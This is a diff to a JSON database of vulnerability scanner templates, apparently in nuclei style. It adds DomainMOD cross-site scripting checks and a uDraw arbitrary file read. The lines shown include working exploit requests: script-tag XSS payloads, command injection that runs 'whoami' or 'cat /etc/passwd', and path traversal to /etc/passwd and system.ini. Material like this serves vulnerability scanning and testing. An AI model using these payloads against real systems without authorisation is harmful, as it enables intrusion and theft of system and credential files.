@@ -5924,6 +5924,22 @@
       ]
     },
     {
+      "id": "CVE-2018-1000856",
+      "info": {
+        "name": "DomainMOD 4.11.01 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_username={{username}}&new_password={{password}}\n",
+            "POST /segments/add.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&raw_domain_list=test.com&new_description=test&new_notes=test\n",
+            "GET /segments/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-1000861",
       "info": {
         "name": "Jenkins - Remote Command Injection",
@@ -6372,11 +6388,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -7050,6 +7066,21 @@
       ]
     },
     {
+      "id": "CVE-2018-19137",
+      "info": {
+        "name": "DomainMOD 4.11.01 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_username={{username}}&new_password={{password}}\n",
+            "GET /assets/edit/ip-address.php?ipid=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&del=1 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-19326",
       "info": {
         "name": "Zyxel VMG1312-B10D 5.13AAXA.8 - Local File Inclusion",
@@ -7125,6 +7156,38 @@
       ]
     },
     {
+      "id": "CVE-2018-19751",
+      "info": {
+        "name": "DomainMOD 4.11.01 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_username={{username}}&new_password={{password}}\n",
+            "POST /admin/ssl-fields/add.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_field_name=new&new_field_type_id=1&new_description=test&new_notes=test\n",
+            "GET /admin/ssl-fields/ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-19752",
+      "info": {
+        "name": "DomainMOD 4.11.01 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_username={{username}}&new_password={{password}}\n",
+            "POST /assets/add/registrar.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_registrar=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_url=test&new_api_registrar_id=0&new_notes=test\n",
+            "GET /assets/registrars.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-19753",
       "info": {
         "name": "Tarantella Enterprise <3.11 - Local File Inclusion",
@@ -7135,6 +7198,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/tarantella/cgi-bin/secure/ttawlogin.cgi/?action=start&pg=../../../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-19892",
+      "info": {
+        "name": "DomainMOD 4.11.01 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_username={{username}}&new_password={{password}}\n",
+            "POST /admin/dw/add-server.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_host=abc&new_protocol=https&new_port=2086&new_username=abc&new_api_token=255&new_hash=&new_notes=\n",
+            "GET /admin/dw/servers.php HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -8123,7 +8202,7 @@
     {
       "id": "CVE-2019-12616",
       "info": {
-        "name": "phpMyAdmin CSRF",
+        "name": "phpMyAdmin < 4.9.0 - CSRF",
         "severity": "medium"
       },
       "requests": [
@@ -10142,7 +10221,7 @@
     {
       "id": "CVE-2020-13158",
       "info": {
-        "name": "Artica Proxy before 4.30.000000 Community Edition - Directory Traversal",
+        "name": "Artica Proxy < 4.30.000000 Community Edition - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -10891,8 +10970,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11337,9 +11416,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -17829,6 +17908,20 @@
       ]
     },
     {
+      "id": "CVE-2022-0656",
+      "info": {
+        "name": "uDraw < 3.3.3 - Unauthenticated Arbitrary File Access",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\n\naction=udraw_convert_url_to_base64&url=/etc/passwd\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0692",
       "info": {
         "name": "Rudloff alltube prior to 3.0.1 - Open Redirect",
@@ -18899,8 +18992,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/elementor/assets/js/frontend.min.js",
-            "{{BaseURL}}/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoidmlkZW8iLCJ1cmwiOiJodHRwOi8vIiwidmlkZW9UeXBlIjoiaG9zdGVkIiwidmlkZW9QYXJhbXMiOnsib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbikifX0="
+            "{{BaseURL}}/wp-content/plugins/elementor/readme.txt"
           ]
         }
       ]
